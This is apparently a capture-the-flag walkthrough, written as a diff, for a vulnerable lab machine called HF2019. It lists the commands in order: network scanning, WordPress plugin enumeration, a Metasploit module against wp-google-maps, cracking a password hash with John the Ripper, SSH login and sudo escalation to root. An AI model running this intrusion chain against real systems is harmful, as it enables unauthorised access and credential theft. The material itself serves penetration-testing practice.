@@ -1,0 +1,30 @@
+1.	Sudo arp-scan -l. 
+	2.	nmap 10.0.2.3
+	3.	ftp anonymous@10.0.2.3
+	4.	wpscan —url http://10.0.2.3/ —enumerate ap 
+	5.	searchsploit google maps
+	6.	msfconsole
+	7.	search wp-google-maps
+	8.	use 0
+	9.	show options 
+	10.	set RHOSTS 10.0.2.3
+	11.	check
+	12.	run 
+	13.	exit
+	14.	nano hash.txt
+	15.	cat hash.txt
+	16.	john —wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+	17.	john —show hash.txt (password is cracked )
+	18.	ssh webmaster@ip(login to HF2019)
+	19.	ls
+	20.	cat flag.txt
+	21.	sudo -l
+	22.	cd ..
+	23.	ls
+	24.	sudo su
+	25.	cd root
+	26.	ls
+	27.	cat flag.txt
+
+
+~ prepared by the honoured one [ Athul KM ]
